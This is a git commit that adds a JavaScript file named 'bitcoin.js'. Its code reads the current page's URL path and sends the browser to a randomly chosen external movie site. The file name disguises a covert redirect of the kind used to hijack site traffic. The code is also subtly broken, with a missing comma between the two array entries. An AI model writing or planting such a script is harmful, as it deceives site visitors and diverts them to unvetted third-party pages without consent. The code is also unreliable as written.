a6ebfceb735de1f401ba198af5656cd0cd78fde6
inisialjurawa <84512688+inisialjurawa@users.noreply.github.com>
2022-02-28 23:45:52 -0600

    Create bitcoin.js

---
+++ bitcoin.js
@@ -0,0 +1,8 @@
+var urlmain = document.URL;
+var param = document.URL.split("/")[3].replace("?m=1","").replace("?m=0","");
+var dataUrl = [
+"https://dev-fivestarmovie.pantheonsite.io/"
+"https://screenmovies3.blogspot.com"
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem + param;
